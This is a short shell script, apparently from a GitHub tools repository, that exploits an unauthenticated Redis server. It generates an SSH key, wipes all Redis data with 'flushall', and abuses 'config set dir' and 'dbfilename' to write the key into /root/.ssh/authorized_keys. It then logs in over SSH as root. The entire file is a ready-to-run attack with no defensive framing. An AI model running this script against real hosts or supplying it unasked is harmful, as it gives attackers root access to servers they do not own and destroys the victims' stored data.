#!/bin/sh
#codeby  https://github.com/limithit/shell_tools  
set -x
if [ $# -ne 1 ]
  then
  echo "Usage: redis_exploit.sh host"
  exit 1
fi
host=$1
rm -rf $HOME/.ssh/pub.txt
ssh-keygen -t rsa -C "today_attack"
redis-cli -h ${host} flushall
echo '\r\n' >>$HOME/.ssh/pub.txt
cat $HOME/.ssh/id_rsa.pub >>$HOME/.ssh/pub.txt
#echo \'\r\n\' >>$HOME/.ssh/pub.txt
echo '\r\n' >>$HOME/.ssh/pub.txt
cat $HOME/.ssh/pub.txt |redis-cli -h ${host} -x set crackit
redis-cli -h ${host} config set dir /root/.ssh
redis-cli -h ${host} config set dbfilename "authorized_keys"
redis-cli -h ${host} save
ssh ${host}
